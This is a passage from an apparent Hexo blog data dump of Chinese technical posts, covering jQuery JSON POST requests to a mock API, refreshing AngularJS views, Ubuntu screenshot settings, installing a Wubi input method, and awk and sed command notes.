img-center\" /></p>\n<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>本文阐述基于如下mock接口：<br>接口：<a href=\"http://openapi.tencentyun.com/v3/user/delete\">http://openapi.tencentyun.com/v3/user/delete</a></p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>参数说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>appid</td>\n<td>应用ID</td>\n</tr>\n<tr>\n<td>appkey</td>\n<td>应用密钥</td>\n</tr>\n<tr>\n<td>userid</td>\n<td>用户ID</td>\n</tr>\n<tr>\n<td>operid</td>\n<td>操作者ID</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"二、请求删除用户\"><a href=\"#二、请求删除用户\" class=\"headerlink\" title=\"二、请求删除用户\"></a>二、请求删除用户</h2><h3 id=\"1-构造请求参数\"><a href=\"#1-构造请求参数\" class=\"headerlink\" title=\"1. 构造请求参数\"></a>1. 构造请求参数</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">var</span> params = &#123;</div><div class=\"line\">    <span class=\"string\">\"appid\"</span>: <span class=\"string\">\"2\"</span>,</div><div class=\"line\">    <span class=\"string\">\"appkey\"</span>: <span class=\"string\">\"5F154D7D2751AEDC8527269006F290F70297B7E54667536C\"</span>,</div><div class=\"line\">    <span class=\"string\">\"userid\"</span>: <span class=\"string\">\"B624064BA065E01CB73F835017FE96FA\"</span>,</div><div class=\"line\">    <span class=\"string\">\"operid\"</span>: <span class=\"string\">\"B624064BA065E01CB73F835017FE96FA\"</span></div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure>","more":"<h3 id=\"2-构造请求\"><a href=\"#2-构造请求\" class=\"headerlink\" title=\"2. 构造请求\"></a>2. 构造请求</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"string\">\"http://openapi.tencentyun.com/v3/user/delete\"</span>;</div><div class=\"line\">$.ajax(&#123;</div><div class=\"line\">    type: <span class=\"string\">\"POST\"</span>,</div><div class=\"line\">    url: url,</div><div class=\"line\">    <span class=\"keyword\">async</span>: <span class=\"literal\">false</span>,</div><div class=\"line\">    processData: <span class=\"literal\">false</span>,</div><div class=\"line\">    data: <span class=\"built_in\">JSON</span>.stringify(params),</div><div class=\"line\">    contentType: <span class=\"string\">\"application/json\"</span>,</div><div class=\"line\">    dataType: <span class=\"string\">'json'</span>,</div><div class=\"line\">    success: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">json</span>) </span>&#123;</div><div class=\"line\">        <span class=\"built_in\">console</span>.log(json);</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;);</div></pre></td></tr></table></figure>\n<h3 id=\"3-需要注意几个地方\"><a href=\"#3-需要注意几个地方\" class=\"headerlink\" title=\"3. 需要注意几个地方\"></a>3. 需要注意几个地方</h3><ul>\n<li>contentType设置为：application/json</li>\n<li>dataType设置为：json</li>\n<li>data必须是字符串，而不是一个js对象</li>\n</ul>\n<h3 id=\"4-json对象转字符串\"><a href=\"#4-json对象转字符串\" class=\"headerlink\" title=\"4. json对象转字符串\"></a>4. json对象转字符串</h3><ul>\n<li>可以对于js自带的JSON.stringify(params)转成字符串</li>\n<li>使用jquery的$.param()方法将json对象序列化成键值对</li>\n</ul>\n<h2 id=\"三、参考文档\"><a href=\"#三、参考文档\" class=\"headerlink\" title=\"三、参考文档\"></a>三、参考文档</h2><p><a href=\"http://stackoverflow.com/questions/6255344/how-can-i-use-jquery-to-post-json-data/6255394#6255394\">How can I use JQuery to post JSON data?</a></p>"},{"title":"angularjs视图跳转不刷新问题","date":"2016-03-09T07:56:00.000Z","_content":"\n<img src=\"/asserts/images/logo/angularjs.png\" class=\"img-logo img-center\" />\n\n\n在实际工作过程中，发现通过 `$state.go(\"stage2\")` 让视图跳转到stage2，但视图内容并不刷新。\n\n## 一、问题解决\n\n### 1. 方法一\n通过修改地址栏内容，模板一次用户通过地址栏输入地址操作。\n\n``` javascript\n//be sure to inject $scope and $location\nvar changeLocation = function(url, forceReload) {\n  $scope = $scope || angular.element(document).scope();\n  if(forceReload || $scope.$$phase) {\n    window.location = url;\n  }\n  else {\n    //only use this if you want to replace the history stack\n    //$location.path(url).replace();\n\n    //this this if you want to change the URL and add it to the history stack\n    $location.path(url);\n    $scope.$apply();\n  }\n};\n```\n\n### 2. 方法二\n通过自带的参数reload，要求视图跳转时强制刷新视图内容。\n``` javascript\n$state.go(\"stage2\", {}, {\"reload\": true});\n```\n\n或者视图跳转完后，通过reloa()方法刷新视图。\n``` javascript\n$state.go(\"stage2\");\n$state.reload(\"stage2\");\n```\n\n\n## 二、参考文档\n- [In Angular, how to redirect with $location.path as $http.post success callback](http://stackoverflow.com/a/14387747)\n- [$state](http://angular-ui.github.io/ui-router/site/#/api/ui.router.state.$state)","source":"_posts/article/js/angularjs视图跳转不刷新问题.md","raw":"title: angularjs视图跳转不刷新问题\ntags:\n  - angularjs\ncategories:\n  - 前端设计\ndate: 2016-03-09 15:56:00\n---\n\n<img src=\"/asserts/images/logo/angularjs.png\" class=\"img-logo img-center\" />\n\n\n在实际工作过程中，发现通过 `$state.go(\"stage2\")` 让视图跳转到stage2，但视图内容并不刷新。\n\n## 一、问题解决\n\n### 1. 方法一\n通过修改地址栏内容，模板一次用户通过地址栏输入地址操作。\n\n``` javascript\n//be sure to inject $scope and $location\nvar changeLocation = function(url, forceReload) {\n  $scope = $scope || angular.element(document).scope();\n  if(forceReload || $scope.$$phase) {\n    window.location = url;\n  }\n  else {\n    //only use this if you want to replace the history stack\n    //$location.path(url).replace();\n\n    //this this if you want to change the URL and add it to the history stack\n    $location.path(url);\n    $scope.$apply();\n  }\n};\n```\n\n### 2. 方法二\n通过自带的参数reload，要求视图跳转时强制刷新视图内容。\n``` javascript\n$state.go(\"stage2\", {}, {\"reload\": true});\n```\n\n或者视图跳转完后，通过reloa()方法刷新视图。\n``` javascript\n$state.go(\"stage2\");\n$state.reload(\"stage2\");\n```\n\n\n## 二、参考文档\n- [In Angular, how to redirect with $location.path as $http.post success callback](http://stackoverflow.com/a/14387747)\n- [$state](http://angular-ui.github.io/ui-router/site/#/api/ui.router.state.$state)","slug":"article/js/angularjs视图跳转不刷新问题","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxso00445nbty3vbyro3","content":"<p><img src=\"/asserts/images/logo/angularjs.png\" class=\"img-logo img-center\"></p>\n<p>在实际工作过程中，发现通过 <code>$state.go(&quot;stage2&quot;)</code> 让视图跳转到stage2，但视图内容并不刷新。</p>\n<h2 id=\"一、问题解决\"><a href=\"#一、问题解决\" class=\"headerlink\" title=\"一、问题解决\"></a>一、问题解决</h2><h3 id=\"1-方法一\"><a href=\"#1-方法一\" class=\"headerlink\" title=\"1. 方法一\"></a>1. 方法一</h3><p>通过修改地址栏内容，模板一次用户通过地址栏输入地址操作。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//be sure to inject $scope and $location</span></div><div class=\"line\"><span class=\"keyword\">var</span> changeLocation = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">url, forceReload</span>) </span>&#123;</div><div class=\"line\">  $scope = $scope || angular.element(<span class=\"built_in\">document</span>).scope();</div><div class=\"line\">  <span class=\"keyword\">if</span>(forceReload || $scope.$$phase) &#123;</div><div class=\"line\">    <span class=\"built_in\">window</span>.location = url;</div><div class=\"line\">  &#125;</div><div class=\"line\">  <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">    <span class=\"comment\">//only use this if you want to replace the history stack</span></div><div class=\"line\">    <span class=\"comment\">//$location.path(url).replace();</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">//this this if you want to change the URL and add it to the history stack</span></div><div class=\"line\">    $location.path(url);</div><div class=\"line\">    $scope.$apply();</div><div class=\"line\">  &#125;</div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure>\n<h3 id=\"2-方法二\"><a href=\"#2-方法二\" class=\"headerlink\" title=\"2. 方法二\"></a>2. 方法二</h3><p>通过自带的参数reload，要求视图跳转时强制刷新视图内容。<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$state.go(<span class=\"string\">\"stage2\"</span>, &#123;&#125;, &#123;<span class=\"string\">\"reload\"</span>: <span class=\"literal\">true</span>&#125;);</div></pre></td></tr></table></figure></p>\n<p>或者视图跳转完后，通过reloa()方法刷新视图。<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">$state.go(<span class=\"string\">\"stage2\"</span>);</div><div class=\"line\">$state.reload(<span class=\"string\">\"stage2\"</span>);</div></pre></td></tr></table></figure></p>\n<h2 id=\"二、参考文档\"><a href=\"#二、参考文档\" class=\"headerlink\" title=\"二、参考文档\"></a>二、参考文档</h2><ul>\n<li><a href=\"http://stackoverflow.com/a/14387747\" target=\"_blank\" rel=\"external\">In Angular, how to redirect with $location.path as $http.post success callback</a></li>\n<li><a href=\"http://angular-ui.github.io/ui-router/site/#/api/ui.router.state.$state\" target=\"_blank\" rel=\"external\">$state</a></li>\n</ul>\n","excerpt":"","more":"<p><img src=\"/asserts/images/logo/angularjs.png\" class=\"img-logo img-center\" /></p>\n<p>在实际工作过程中，发现通过 <code>$state.go(&quot;stage2&quot;)</code> 让视图跳转到stage2，但视图内容并不刷新。</p>\n<h2 id=\"一、问题解决\"><a href=\"#一、问题解决\" class=\"headerlink\" title=\"一、问题解决\"></a>一、问题解决</h2><h3 id=\"1-方法一\"><a href=\"#1-方法一\" class=\"headerlink\" title=\"1. 方法一\"></a>1. 方法一</h3><p>通过修改地址栏内容，模板一次用户通过地址栏输入地址操作。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//be sure to inject $scope and $location</span></div><div class=\"line\"><span class=\"keyword\">var</span> changeLocation = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">url, forceReload</span>) </span>&#123;</div><div class=\"line\">  $scope = $scope || angular.element(<span class=\"built_in\">document</span>).scope();</div><div class=\"line\">  <span class=\"keyword\">if</span>(forceReload || $scope.$$phase) &#123;</div><div class=\"line\">    <span class=\"built_in\">window</span>.location = url;</div><div class=\"line\">  &#125;</div><div class=\"line\">  <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">    <span class=\"comment\">//only use this if you want to replace the history stack</span></div><div class=\"line\">    <span class=\"comment\">//$location.path(url).replace();</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">//this this if you want to change the URL and add it to the history stack</span></div><div class=\"line\">    $location.path(url);</div><div class=\"line\">    $scope.$apply();</div><div class=\"line\">  &#125;</div><div class=\"line\">&#125;;</div></pre></td></tr></table></figure>\n<h3 id=\"2-方法二\"><a href=\"#2-方法二\" class=\"headerlink\" title=\"2. 方法二\"></a>2. 方法二</h3><p>通过自带的参数reload，要求视图跳转时强制刷新视图内容。<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$state.go(<span class=\"string\">\"stage2\"</span>, &#123;&#125;, &#123;<span class=\"string\">\"reload\"</span>: <span class=\"literal\">true</span>&#125;);</div></pre></td></tr></table></figure></p>\n<p>或者视图跳转完后，通过reloa()方法刷新视图。<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">$state.go(<span class=\"string\">\"stage2\"</span>);</div><div class=\"line\">$state.reload(<span class=\"string\">\"stage2\"</span>);</div></pre></td></tr></table></figure></p>\n<h2 id=\"二、参考文档\"><a href=\"#二、参考文档\" class=\"headerlink\" title=\"二、参考文档\"></a>二、参考文档</h2><ul>\n<li><a href=\"http://stackoverflow.com/a/14387747\">In Angular, how to redirect with $location.path as $http.post success callback</a></li>\n<li><a href=\"http://angular-ui.github.io/ui-router/site/#/api/ui.router.state.$state\">$state</a></li>\n</ul>\n"},{"title":"Ubuntu更改截图默认保存位置","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/ubuntu.png\" class=\"img-logo img-center\" />\n\n\n## 图形界面\n\n安装dconf-editor\n> sudo apt-get install dconf-editor\n\n打开dconf-editor，进入org -> gnome -> gnome-screenshot，修改auto-save-directory值为 file:///home/yeshaoting/Pictures/screenshot/。\n\n\n## 命令行\n> gsettings set org.gnome.gnome-screenshot auto-save-directory \"file:///home/yeshaoting/Pictures/screenshot/\"\n\n## 参考文档\n[Default save directory for gnome-screenshot?](http://askubuntu.com/a/134469)","source":"_posts/article/linux/Ubuntu更改截图默认保存位置.md","raw":"categories:\n  - 系统配置\ntags:\n  - ubuntu\ntitle: Ubuntu更改截图默认保存位置\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/ubuntu.png\" class=\"img-logo img-center\" />\n\n\n## 图形界面\n\n安装dconf-editor\n> sudo apt-get install dconf-editor\n\n打开dconf-editor，进入org -> gnome -> gnome-screenshot，修改auto-save-directory值为 file:///home/yeshaoting/Pictures/screenshot/。\n\n\n## 命令行\n> gsettings set org.gnome.gnome-screenshot auto-save-directory \"file:///home/yeshaoting/Pictures/screenshot/\"\n\n## 参考文档\n[Default save directory for gnome-screenshot?](http://askubuntu.com/a/134469)","slug":"article/linux/Ubuntu更改截图默认保存位置","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxsr00465nbtytfpqxwd","content":"<p><img src=\"/asserts/images/logo/ubuntu.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"图形界面\"><a href=\"#图形界面\" class=\"headerlink\" title=\"图形界面\"></a>图形界面</h2><p>安装dconf-editor</p>\n<blockquote>\n<p>sudo apt-get install dconf-editor</p>\n</blockquote>\n<p>打开dconf-editor，进入org -&gt; gnome -&gt; gnome-screenshot，修改auto-save-directory值为 file:///home/yeshaoting/Pictures/screenshot/。</p>\n<h2 id=\"命令行\"><a href=\"#命令行\" class=\"headerlink\" title=\"命令行\"></a>命令行</h2><blockquote>\n<p>gsettings set org.gnome.gnome-screenshot auto-save-directory “file:///home/yeshaoting/Pictures/screenshot/“</p>\n</blockquote>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><p><a href=\"http://askubuntu.com/a/134469\" target=\"_blank\" rel=\"external\">Default save directory for gnome-screenshot?</a></p>\n","excerpt":"","more":"<p><img src=\"/asserts/images/logo/ubuntu.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"图形界面\"><a href=\"#图形界面\" class=\"headerlink\" title=\"图形界面\"></a>图形界面</h2><p>安装dconf-editor</p>\n<blockquote>\n<p>sudo apt-get install dconf-editor</p>\n</blockquote>\n<p>打开dconf-editor，进入org -&gt; gnome -&gt; gnome-screenshot，修改auto-save-directory值为 file:///home/yeshaoting/Pictures/screenshot/。</p>\n<h2 id=\"命令行\"><a href=\"#命令行\" class=\"headerlink\" title=\"命令行\"></a>命令行</h2><blockquote>\n<p>gsettings set org.gnome.gnome-screenshot auto-save-directory “file:///home/yeshaoting/Pictures/screenshot/“</p>\n</blockquote>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><p><a href=\"http://askubuntu.com/a/134469\">Default save directory for gnome-screenshot?</a></p>\n"},{"title":"Linux安装极点五笔的方法","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/ubuntu.png\" class=\"img-logo img-center\" />\n\n\n## 一、下载附件文件vissible-ibus.tar.gz\n免费下载地址在http://linux.linuxidc.com/\n用户名与密码都是www.linuxidc.com\n具体下载目录在/pub/2011/10/23/Ubuntu 11.10安装极点五笔/\n\n\n## 二、安装\n``` bash\n$ tar xvzf vissible-ibus.tar.gz\n$ cd vissible-ibus\n$ sudo cp vissible.db /usr/share/ibus-table/tables\n$ sudo cp vissible.gif /usr/share/ibus-table/icons\n```\n\n<!-- more -->\n\n## 三、删除文件\n``` bash\n$ rm vissible-ibus.tar.gz\n$ rm vissible.db\n$ rm vissible.gif\n$ rm vissible.txt\n```\n\n\n## 四、启动输入法\n在任务栏右键点那个键盘小图标，在下拉菜单选“重新重启”（这个重新启动并不是重并报启动系统，\n而是重新启动ibus输入法），然后再右键点那个键盘小图标并在下拉菜单中选“首选项”，然后在弹\n出的窗口中点击“输入法”选项卡，接着点“选择输入法”，然后添加极点五笔就可以了。\n\n\n## 五、修改右shift为中英文切换\n把table.py里的Shift_R改为Shift_L\n``` bash\n$ sudo vim table.py\n\n# Match mode switch hotkey\nif not self._editor._t_chars and ( self._match_hotkey (key, keysyms.Shift_L, modifier.SHIFT_MASK + modifier.RELEASE_MASK))\n\n……\n\nif self._match_hotkey (key, keysyms.Shift_R, modifier.SHIFT_MASK + modifier.RELEASE_MASK) and self._ime_py\n```\n\n\n## 六、参考文档\nhttp://hi.baidu.com/hkdog/item/8ae75ea5938e23de5af191ff\n","source":"_posts/article/linux/Linux安装极点五笔的方法.md","raw":"categories:\n  - 系统配置\ntags:\n  - 五笔\n  - ubuntu\ntitle: Linux安装极点五笔的方法\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/ubuntu.png\" class=\"img-logo img-center\" />\n\n\n## 一、下载附件文件vissible-ibus.tar.gz\n免费下载地址在http://linux.linuxidc.com/\n用户名与密码都是www.linuxidc.com\n具体下载目录在/pub/2011/10/23/Ubuntu 11.10安装极点五笔/\n\n\n## 二、安装\n``` bash\n$ tar xvzf vissible-ibus.tar.gz\n$ cd vissible-ibus\n$ sudo cp vissible.db /usr/share/ibus-table/tables\n$ sudo cp vissible.gif /usr/share/ibus-table/icons\n```\n\n<!-- more -->\n\n## 三、删除文件\n``` bash\n$ rm vissible-ibus.tar.gz\n$ rm vissible.db\n$ rm vissible.gif\n$ rm vissible.txt\n```\n\n\n## 四、启动输入法\n在任务栏右键点那个键盘小图标，在下拉菜单选“重新重启”（这个重新启动并不是重并报启动系统，\n而是重新启动ibus输入法），然后再右键点那个键盘小图标并在下拉菜单中选“首选项”，然后在弹\n出的窗口中点击“输入法”选项卡，接着点“选择输入法”，然后添加极点五笔就可以了。\n\n\n## 五、修改右shift为中英文切换\n把table.py里的Shift_R改为Shift_L\n``` bash\n$ sudo vim table.py\n\n# Match mode switch hotkey\nif not self._editor._t_chars and ( self._match_hotkey (key, keysyms.Shift_L, modifier.SHIFT_MASK + modifier.RELEASE_MASK))\n\n……\n\nif self._match_hotkey (key, keysyms.Shift_R, modifier.SHIFT_MASK + modifier.RELEASE_MASK) and self._ime_py\n```\n\n\n## 六、参考文档\nhttp://hi.baidu.com/hkdog/item/8ae75ea5938e23de5af191ff\n","slug":"article/linux/Linux安装极点五笔的方法","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxsv00495nbtk77wxz34","content":"<p><img src=\"/asserts/images/logo/ubuntu.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、下载附件文件vissible-ibus-tar-gz\"><a href=\"#一、下载附件文件vissible-ibus-tar-gz\" class=\"headerlink\" title=\"一、下载附件文件vissible-ibus.tar.gz\"></a>一、下载附件文件vissible-ibus.tar.gz</h2><p>免费下载地址在<a href=\"http://linux.linuxidc.com/\" target=\"_blank\" rel=\"external\">http://linux.linuxidc.com/</a><br>用户名与密码都是www.linuxidc.com<br>具体下载目录在/pub/2011/10/23/Ubuntu 11.10安装极点五笔/</p>\n<h2 id=\"二、安装\"><a href=\"#二、安装\" class=\"headerlink\" title=\"二、安装\"></a>二、安装</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ tar xvzf vissible-ibus.tar.gz</div><div class=\"line\">$ <span class=\"built_in\">cd</span> vissible-ibus</div><div class=\"line\">$ sudo cp vissible.db /usr/share/ibus-table/tables</div><div class=\"line\">$ sudo cp vissible.gif /usr/share/ibus-table/icons</div></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h2 id=\"三、删除文件\"><a href=\"#三、删除文件\" class=\"headerlink\" title=\"三、删除文件\"></a>三、删除文件</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ rm vissible-ibus.tar.gz</div><div class=\"line\">$ rm vissible.db</div><div class=\"line\">$ rm vissible.gif</div><div class=\"line\">$ rm vissible.txt</div></pre></td></tr></table></figure>\n<h2 id=\"四、启动输入法\"><a href=\"#四、启动输入法\" class=\"headerlink\" title=\"四、启动输入法\"></a>四、启动输入法</h2><p>在任务栏右键点那个键盘小图标，在下拉菜单选“重新重启”（这个重新启动并不是重并报启动系统，<br>而是重新启动ibus输入法），然后再右键点那个键盘小图标并在下拉菜单中选“首选项”，然后在弹<br>出的窗口中点击“输入法”选项卡，接着点“选择输入法”，然后添加极点五笔就可以了。</p>\n<h2 id=\"五、修改右shift为中英文切换\"><a href=\"#五、修改右shift为中英文切换\" class=\"headerlink\" title=\"五、修改右shift为中英文切换\"></a>五、修改右shift为中英文切换</h2><p>把table.py里的Shift_R改为Shift_L<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ sudo vim table.py</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Match mode switch hotkey</span></div><div class=\"line\"><span class=\"keyword\">if</span> not self._editor._t_chars and ( self._match_hotkey (key, keysyms.Shift_L, modifier.SHIFT_MASK + modifier.RELEASE_MASK))</div><div class=\"line\"></div><div class=\"line\">……</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> self._match_hotkey (key, keysyms.Shift_R, modifier.SHIFT_MASK + modifier.RELEASE_MASK) and self._ime_py</div></pre></td></tr></table></figure></p>\n<h2 id=\"六、参考文档\"><a href=\"#六、参考文档\" class=\"headerlink\" title=\"六、参考文档\"></a>六、参考文档</h2><p><a href=\"http://hi.baidu.com/hkdog/item/8ae75ea5938e23de5af191ff\" target=\"_blank\" rel=\"external\">http://hi.baidu.com/hkdog/item/8ae75ea5938e23de5af191ff</a></p>\n","excerpt":"<p><img src=\"/asserts/images/logo/ubuntu.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、下载附件文件vissible-ibus-tar-gz\"><a href=\"#一、下载附件文件vissible-ibus-tar-gz\" class=\"headerlink\" title=\"一、下载附件文件vissible-ibus.tar.gz\"></a>一、下载附件文件vissible-ibus.tar.gz</h2><p>免费下载地址在<a href=\"http://linux.linuxidc.com/\">http://linux.linuxidc.com/</a><br>用户名与密码都是www.linuxidc.com<br>具体下载目录在/pub/2011/10/23/Ubuntu 11.10安装极点五笔/</p>\n<h2 id=\"二、安装\"><a href=\"#二、安装\" class=\"headerlink\" title=\"二、安装\"></a>二、安装</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ tar xvzf vissible-ibus.tar.gz</div><div class=\"line\">$ <span class=\"built_in\">cd</span> vissible-ibus</div><div class=\"line\">$ sudo cp vissible.db /usr/share/ibus-table/tables</div><div class=\"line\">$ sudo cp vissible.gif /usr/share/ibus-table/icons</div></pre></td></tr></table></figure>","more":"<h2 id=\"三、删除文件\"><a href=\"#三、删除文件\" class=\"headerlink\" title=\"三、删除文件\"></a>三、删除文件</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ rm vissible-ibus.tar.gz</div><div class=\"line\">$ rm vissible.db</div><div class=\"line\">$ rm vissible.gif</div><div class=\"line\">$ rm vissible.txt</div></pre></td></tr></table></figure>\n<h2 id=\"四、启动输入法\"><a href=\"#四、启动输入法\" class=\"headerlink\" title=\"四、启动输入法\"></a>四、启动输入法</h2><p>在任务栏右键点那个键盘小图标，在下拉菜单选“重新重启”（这个重新启动并不是重并报启动系统，<br>而是重新启动ibus输入法），然后再右键点那个键盘小图标并在下拉菜单中选“首选项”，然后在弹<br>出的窗口中点击“输入法”选项卡，接着点“选择输入法”，然后添加极点五笔就可以了。</p>\n<h2 id=\"五、修改右shift为中英文切换\"><a href=\"#五、修改右shift为中英文切换\" class=\"headerlink\" title=\"五、修改右shift为中英文切换\"></a>五、修改右shift为中英文切换</h2><p>把table.py里的Shift_R改为Shift_L<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ sudo vim table.py</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Match mode switch hotkey</span></div><div class=\"line\"><span class=\"keyword\">if</span> not self._editor._t_chars and ( self._match_hotkey (key, keysyms.Shift_L, modifier.SHIFT_MASK + modifier.RELEASE_MASK))</div><div class=\"line\"></div><div class=\"line\">……</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> self._match_hotkey (key, keysyms.Shift_R, modifier.SHIFT_MASK + modifier.RELEASE_MASK) and self._ime_py</div></pre></td></tr></table></figure></p>\n<h2 id=\"六、参考文档\"><a href=\"#六、参考文档\" class=\"headerlink\" title=\"六、参考文档\"></a>六、参考文档</h2><p><a href=\"http://hi.baidu.com/hkdog/item/8ae75ea5938e23de5af191ff\">http://hi.baidu.com/hkdog/item/8ae75ea5938e23de5af191ff</a></p>"},{"title":"Linux命令小记","date":"2016-01-15T10:02:00.000Z","_content":"\n<img src=\"/asserts/images/logo/ubuntu.png\" class=\"img-logo img-center\" />\n\n\n## 一、awk命令\n\n### 1. 删除重复的、非连续的行\n``` shell\n`awk '! a[$0]++'`\n```\n\n\n### 2. awk使用特殊分隔符分隔列\n``` shell\necho \"192.168.102.134\" | awk -F . '{print $4}'\n```\n\n\n## 二、sed命令\n\n### 1. 截取程序日志中某个时间范围内的文本\n``` shell\nsed -n '/^2015-05-14 15:32:30/,/^2015-05-14 16:12:09/p' access_log > log.txt\n```\n\n### 2. 去除空白行的sed\n``` shell\nSECRET=`sed '/^$/d' file.txt | head -1`\n```\n\n### 3. 通过sed替换字特殊字符\n`echo \"12,34,56\" | sed 's/,/ /g'`\n\n\n### 4. 通过sed替换二者之间的字符串内容\n文本内容：\n``` xml\n<server   id=\"film-web\"   address=\"127.0.0.1\" port=\"6881\">\n</server>\n```\n\n``` shell\nsed -n \"s/\\( *server.*port=\\\"\\).*\\(\\\".*\\)/\\1abc\\2/p\" 1.txt\nsed -n \"s/\\( *server.*address=\\\"\\).*\\(\\\" *port\\)/\\1abc\\2/p\" 1.txt\n```\n\n**注**：sed里，使用圆括号括起来的内容，可以看做是变量。使用\\1和\\2来输出。\n**参见**：http://coolshell.cn/articles/9104.html 圆括号匹配\n\n\n### 5. 从替换开始匹配行到行尾或结束匹配行区间内替换内容\n``` shell\nsed -i \"/ *server *id=/,\\${s/\\(\\<watchdog-port>\\).*\\(<\\/watchdog-port>\\)/\\18000\\2/g;}\" resin.conf\nsed \"/ *server *id=\\\"/,/<\\/server>/{s/\\(\\<watchdog-port>\\).*\\(<\\/watchdog-port>\\)/\\18888\\2/g;}\" resin.conf\n```\n\n**注**：每个匹配前后都需要加/，见上面红色部分。$表示最后一行，不需要加/\n\n\n## 